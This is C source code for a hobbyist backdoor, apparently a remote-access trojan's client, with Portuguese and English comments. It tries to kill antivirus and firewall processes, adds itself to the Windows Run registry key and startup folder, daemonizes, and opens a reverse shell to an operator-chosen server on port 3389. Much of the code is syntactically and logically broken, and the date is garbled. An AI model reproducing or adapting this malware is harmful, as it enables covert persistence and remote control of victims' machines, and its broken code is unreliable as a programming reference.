/* Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.

Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.

JÁ PRONTOS: desativar anti-virus e firewall
            copiar-se para o registro
            copiar-se para o menu iniciar

terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.

// use without abuse.

// POC!

// coder  mrx6s0

*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <X11/Xlib.h>

#define remote_addr "0.0.0.0" /* your dark server here */ 
#define remote_port 3389

#define false 0
#define true 1


/* struct of configurations to target. */

  typedef struct {

  int REMOTE_ADDR; /*remote_addr */
  int REMOTE_PORT; /* remote port */
  int x;

  } Target;

  int x = true;

  void error (char *err)

  {

  perror(err);
  exit(EXIT_SUCCESS);
  return;

  } /* return without exceptions... and keep the routine.


  //function  to disable antivirus. */

  void kill_antivirus()

  {

     FILE *arq;

    arq = fopen("av.txt", "rb");
    if(arq == NULL)
        return;
    else
    dup2(x,0),dup2(x,1);

   execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
   send(x,"Killing anti virus...\n",31,0);
   execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);

   return;


   }

/* in this, i use a .vbs file, and invoked from execve(); */

  void kill_firewall()

  {

   dup2(x, 0);
   execve("firewall.vbs", 0, 0);

   return;

  }

  // function that auto copy the software into the register of target machine

  void auto_copy()

  {

     dup2(x, 0);

     execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe",0,0);
     execve("cp wopnt.exe /usr/bin",NULL,NULL"); 
     return;

  }

  void copy_to_registry()

  {

    dup2(x, 0);
    dup2(x,1);

    execve("copy /Y wins32.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
    execve("cp wins32.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */

    return;
  }


  /*função para o programa rodar em background, como uma daemon


   create connection */

  void 
  shell()

  {

    struct sockaddr_in s;
  
    int root;
    char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
    char *cmd[] = { "/bin/sh", (char *)0 };

   /* the daemon thing... */

    XFreeCursor;

    pid_t pid;
	pid = fork();

	if(pid < 0 )
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();

        if (pid < 0)
            exit(EXIT_FAILURE);

        if (pid > 0)
            exit(EXIT_SUCCESS);

        sigmask(0);

        chdir("/, C:\\, C:\\Windows\\System32");

        int k;

        for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--)

        {
            close(k);

    /* setting up the connection */

     memset(s.sin_zero, '\0', sizeof s.sin_zero); /*aloca espaço de memória para o PIPE socket. */
    
     s.sin_family = AF_INET; /* família de protocolos */
     s.sin_addr.s_addr = inet_addr(remote_addr);
     s.sin_port = htons(remote_port);

     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */

    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                   discomment this if u think necessary... */


    /* when connection arrives, i've got the backdoor control. */

     (connect(x, (struct sockaddr *)&s, sizeof(s)));
     if (connect == -1)
     perror("socket(SOCKET_CONNECT)connect_failed");

     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR)failed");

     /* don't freeze the memory, dude */

     sleep(5); /* sleep for 5 sec */

     /*enter in a shell, finally */

    /* anyway, here are where the conditions come... */

    /* fck, now  i have power!

      made conditions here. */

     send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0);
     if(connect == -1)
     perror("BREAK CONNECTION,(failure)");
     else

     send(x,"\n#root > /n",7,0);
     /*fflush(stdout);  DON'T! */

     dup2(x, 0),dup2(x, 1),dup2(x, 2);
     root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);

     while(true);


     }


}

     /* execute the program */

     int main(int argc, char **argv)

     {

     {

      /* this is generic */

      if(auto_copy == false)
      perror("error in auto_copy");
      else
           auto_copy();
      if(copy_to_registry == false)
      perror("error copying to registry");
      else
          copy_to_registry();
      if(kill_antivirus == false)
      perror("kill anti virus failed...");
      else
          kill_antivirus();
      if(kill_firewall == false)
      perror("kill firewall failed... retrying");
      else
          kill_firewall();
      sleep(0.2);

      }

      /*shell run while the connection for true */

      do {

      shell();

      }


      while (connect == (true));


      {


    }



 }
